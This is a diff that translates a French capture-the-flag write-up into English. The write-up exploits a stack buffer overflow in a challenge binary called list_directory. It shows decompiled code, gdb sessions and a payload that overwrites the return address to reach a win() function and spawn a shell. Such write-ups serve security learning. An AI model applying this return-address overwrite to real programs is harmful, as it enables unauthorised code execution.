@@ -1,6 +1,6 @@
 # List Directory
 
-Sujet :
+Subject :
 
 ```md
 I am making a program to replace ls, but I have not even started and a friend told me it was unsecure, can you investigate for me ?
@@ -8,7 +8,7 @@ I am making a program to replace ls, but I have not even started and a friend to
 http://internetcest.fun:13339
 ```
 
-[Cet executable](./list_directory) est fournis. Essayons le :
+[This binary](./list_directory) is given. Let's try it out :
 
 ```bash
 $ ./list_directory 
@@ -19,7 +19,7 @@ Not implemented yet!
 
 # Reverse
 
-Avec ghidra on obtient les fonctions suivantes :
+Using Ghidra, we can find those functions :
 
 ```C
 undefined8 main(undefined4 param_1,undefined8 param_2)
@@ -81,31 +81,33 @@ void win(void)
 }
 ```
 
-On comprends que la fonction main() récupère l'entrée de l'utilisateur :
+We can understand that the main() function is getting the user input : 
 
 ```C
 sVar3 = read(0,pcVar1,(long)PATH_LEN);
 ```
 
-Le passe à la fonction vuln() :
+Passing it to the vuln() function :
 
 ```C
 vuln(pcVar1);
 ```
 
-Et que la fonction vuln() va le copier dans une variable locale :
+And the vuln() function is copying it to a local variable :
 
 ```C
 memcpy(&local_20,param_1,(long)PATH_LEN);
 ```
 
-Il faut donc exploiter le buffer overflow pour rediriger le programme vers la fonction win(), après vuln().  
+Let's try and exploit a buffer overflow to redirect the program towards the win() function after vuln().  
   
-Le code étant extrêmement obfusqué, utilisons gdb pour voir ce qu'il se passe dans la mémoire au lieu d'essayer de le comprendre.
+This function being extremely obfuscated, let's try to analyse the binary dynamically instead of understanding all of the code.
 
 # Payload
 
-On ouvre le programme dans gdb, place des breakpoints aux points clés, et observe si l'on voit la valeur entrée dans la stack :
+We're going to use gdb to observe what's going on with our input during the execution of this program.  
+  
+First let's put breakpoints all over the program :
 
 ```gdb
 (gdb) disas main
@@ -210,7 +212,12 @@ Dump of assembler code for function vuln:
 End of assembler dump.
 (gdb) break *vuln+78
 Breakpoint 4 at 0x401204
-(gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*4)')
+```
+
+Now, we're going to input 4 "\x41", and print out the stack at every break to try and find our input :
+
+```gdb
+(gdb) run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*4)')
 Starting program: /home/coucou/Documents/CTF_SSI_2024/03_List_Directory/list_directory <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*4)')
 [Thread debugging using libthread_db enabled]
 Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
@@ -257,7 +264,7 @@ Breakpoint 4, 0x0000000000401204 in vuln ()
 0x7fffffffd930:	0xffffda00	0x00007fff	0x004012e8	0x00000000
 0x7fffffffd940:	0x41414141	0x0000000a	0x00000000	0x00000000
 0x7fffffffd950:	0xf7f99600	0x00007fff	0xf7e47e89	0x00007fff
-(gdb) ni
+(gdb) next instruction
 0x0000000000401209 in vuln ()
 (gdb) x/24wx $rsp
 0x7fffffffd900:	0x00000000	0x00000000	0xffffd940	0x00007fff
@@ -266,7 +273,7 @@ Breakpoint 4, 0x0000000000401204 in vuln ()
 0x7fffffffd930:	0xffffda00	0x00007fff	0x004012e8	0x00000000
 0x7fffffffd940:	0x41414141	0x0000000a	0x00000000	0x00000000
 0x7fffffffd950:	0xf7f99600	0x00007fff	0xf7e47e89	0x00007fff
-(gdb) i r
+(gdb) info register
 rax            0x7fffffffd918      140737488345368
 rbx            0x7fffffffd9b0      140737488345520
 rcx            0xa414141           172048705
@@ -293,10 +300,12 @@ fs             0x0                 0
 gs             0x0                 0
 ```
 
-On voit que l'entrée saisie par l'utilisateur n'est pas modifié avant d'être envoyé à vuln(), et que la fonction vuln() le copie directement dans la stack. En inspectant le registre pour trouver l'adresse du rbp, on obtient un payload permettant de modifier l'adresse vers laquelle vuln() va retourner :
+We can see that our input is constantly present in the stack and not being modified before it's passed on to the vuln() function.  
+  
+Looking at the register and where the rbp is stored in vuln(), we can determine that we need to write over 32 bytes to reach the return pointer. Let's try a payload : 32 bytes to reach the return address, and a pointer to the win() function.
 
 ```gdb
-(gdb) i func win
+(gdb) info func win
 All functions matching regular expression "win":
 
 File ../sysdeps/generic/unwind-resume.c:
@@ -327,7 +336,7 @@ File ./nptl/unwind.c:
 
 Non-debugging symbols:
 0x0000000000401176  win
-(gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32+b"\x76\x11\x40\x00"+b"\x00"*4)')
+(gdb) run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32+b"\x76\x11\x40\x00"+b"\x00"*4)')
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
 Starting program: /home/coucou/Documents/CTF_SSI_2024/03_List_Directory/list_directory <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32+b"\x76\x11\x40\x00"+b"\x00"*4)')
@@ -335,21 +344,6 @@ Starting program: /home/coucou/Documents/CTF_SSI_2024/03_List_Directory/list_dir
 Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 Enter the path you want to list: 
 
-Breakpoint 1, 0x00000000004012c2 in main ()
-(gdb) c
-Continuing.
-
-Breakpoint 2, 0x00000000004012e3 in main ()
-(gdb) c
-Continuing.
-
-Breakpoint 3, 0x00000000004011b6 in vuln ()
-(gdb) c
-Continuing.
-
-Breakpoint 4, 0x0000000000401204 in vuln ()
-(gdb) c
-Continuing.
 Not implemented yet! 
 Bravo !
 
@@ -358,7 +352,7 @@ Program received signal SIGSEGV, Segmentation fault.
 148	../sysdeps/posix/system.c: No such file or directory.
 ```
 
-On est bien au message de succès, mais on tombe ensuite sur un SIGSEV. Allons voir où le programme s'arrête exactement : 
+We reached the success message, but ran into a SIGSEGV. Let's take a closer look :
 
 ```gdb
 (gdb) 
@@ -370,7 +364,7 @@ Program received signal SIGSEGV, Segmentation fault.
 => 0x7ffff7e15603 <do_system+339>:	movaps %xmm0,0x50(%rsp)
 ```
 
-Le programme s'arrête sur une instruction movaps, on comprend d'après [ce blog](https://ropemporium.com/guide.html#Common-pitfalls) que la stack n'est pas aligné correctement en conséquence de nos injections. D'après ce même blog il faudrait rajouter une instruction ret pour la réaligner. Essayons de call à nouveau l'instruction ret dans notre payload, avant d'appeler la fonction win :
+Using the `x/wi` which prints the instruction at the given address, we can find out that the program crashed while trying to execute a movaps instruction. Thanks to [this blog](https://ropemporium.com/guide.html#Common-pitfalls), we can understand that the stack might be misaligned because of our injections. Apparently we need execute a `ret` instruction to realign it. Let's find an address to a `ret` instruction :
 
 ```gdb
 (gdb) disas vuln
@@ -400,6 +394,11 @@ Dump of assembler code for function vuln:
    0x0000000000401219 <+99>:	leave
    0x000000000040121a <+100>:	ret
 End of assembler dump.
+```
+
+The last instruction of vuln() being `ret`, let's use this one. Now let's try a new payload : 32 bytes to reach the return address, a pointer to the `ret` instruction, and a pointer to the win() function.
+
+```gdb
 (gdb)  r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32+b"\x1a\x12\x40\x00"+b"\x00"*4+b"\x76\x11\x40\x00"+b"\x00"*4)')
 Starting program: /home/coucou/Documents/CTF_SSI_2024/03_List_Directory/list_directory <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32+b"\x1a\x12\x40\x00"+b"\x00"*4+b"\x76\x11\x40\x00"+b"\x00"*4)')
 [Thread debugging using libthread_db enabled]
@@ -407,53 +406,17 @@ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 Enter the path you want to list: 
 Not implemented yet! 
 
-Breakpoint 1, 0x000000000040121a in vuln ()
-(gdb) x/20wx $rsp
-0x7fffffffd938:	0x0040121a	0x00000000	0x00401176	0x00000000
-0x7fffffffd948:	0x4141410a	0x41414141	0x41414141	0x41414141
-0x7fffffffd958:	0x41414141	0x41414141	0x0040121a	0x00000000
-0x7fffffffd968:	0x00401176	0x00000000	0x0000000a	0x00000000
-0x7fffffffd978:	0xffffd9b0	0x00007fff	0xffffd9a0	0x00007fff
-(gdb) c
-Continuing.
-
-Breakpoint 1, 0x000000000040121a in vuln ()
-(gdb) x/20wx $rsp
-0x7fffffffd940:	0x00401176	0x00000000	0x4141410a	0x41414141
-0x7fffffffd950:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fffffffd960:	0x0040121a	0x00000000	0x00401176	0x00000000
-0x7fffffffd970:	0x0000000a	0x00000000	0xffffd9b0	0x00007fff
-0x7fffffffd980:	0xffffd9a0	0x00007fff	0x00000000	0x00000000
-(gdb) c
-Continuing.
-
-Breakpoint 2, 0x0000000000401176 in win ()
-(gdb) c
-Continuing.
 Bravo !
 [Detaching after vfork from child process 9156]
 
 Program received signal SIGSEGV, Segmentation fault.
 0x000000000040119a in win ()
-(gdb) disas
-Dump of assembler code for function win:
-   0x0000000000401176 <+0>:	push   %rbp
-   0x0000000000401177 <+1>:	mov    %rsp,%rbp
-   0x000000000040117a <+4>:	lea    0xe87(%rip),%rax        # 0x402008
-   0x0000000000401181 <+11>:	mov    %rax,%rdi
-   0x0000000000401184 <+14>:	call   0x401030 <puts@plt>
-   0x0000000000401189 <+19>:	lea    0xe80(%rip),%rax        # 0x402010
-   0x0000000000401190 <+26>:	mov    %rax,%rdi
-   0x0000000000401193 <+29>:	call   0x401060 <system@plt>
-   0x0000000000401198 <+34>:	nop
-   0x0000000000401199 <+35>:	pop    %rbp
-=> 0x000000000040119a <+36>:	ret
-End of assembler dump.
 ```
 
-Le shell c'est bien lancé, puis refermé. Essayons sur l'executable :
+Gdb started a new process, let's try this payload on the binary the same way we did on the previous challenges :
 
-```bash
+
+```console
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32+b"\x1a\x12\x40\x00"+b"\x00"*4+b"\x76\x11\x40\x00"+b"\x00"*4)' ; tee) | ./list_directory 
 Enter the path you want to list: 
 Not implemented yet! 
@@ -463,13 +426,13 @@ coucou
 ls
 exploit.py  list_directory  README.md
 ```
-Le shell c'est bien lancé, le payload final est donc `"\x41"*32+"\x1a\x12\x40\x00"+"\x00"*4+"\x76\x11\x40\x00"+"\x00"*4`.
+We successfully opened a shell, our final payload is : `"\x41"*32+"\x1a\x12\x40\x00"+"\x00"*4+"\x76\x11\x40\x00"+"\x00"*4`.
 
 # Script
 
-De la même manière que le chall précedent, on utilise [ce script python](./exploit.py) pour se connecter, envoyer le payload, et interagir avec le shell.
+Now let's use [this script](./exploit.py) to send our payload.
 
-```bash
+```console
 $ python3 ./exploit.py
 b'Enter the path you want to list: \nNot implemented yet! \nBravo !\n'
 whoami
